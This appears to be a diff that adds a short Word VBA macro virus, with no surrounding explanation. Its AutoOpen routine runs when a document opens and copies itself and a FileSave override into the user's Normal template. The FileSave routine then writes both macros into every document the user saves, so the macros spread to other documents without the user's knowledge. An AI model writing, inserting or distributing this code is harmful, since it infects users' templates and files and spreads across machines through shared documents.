@@ -1,0 +1,18 @@
+Sub AutoOpen()
+  iMacroCount = WordBasic.CountMacros(0, 0)
+  For i = 1 To iMacroCount
+    If WordBasic.MacroName$(i, 0, 0) = "FileSave" Then
+      bInstalled = -1
+    End If
+  Next i
+  If Not bInstalled = -1 Then
+    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "FileSave", wdOrganizerObjectProjectItems
+    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "AutoOpen", wdOrganizerObjectProjectItems
+  End If
+End Sub
+
+Sub FileSave()
+  Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "AutoOpen", wdOrganizerObjectProjectItems
+  Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "FileSave", wdOrganizerObjectProjectItems
+  ActiveDocument.Save
+End Sub
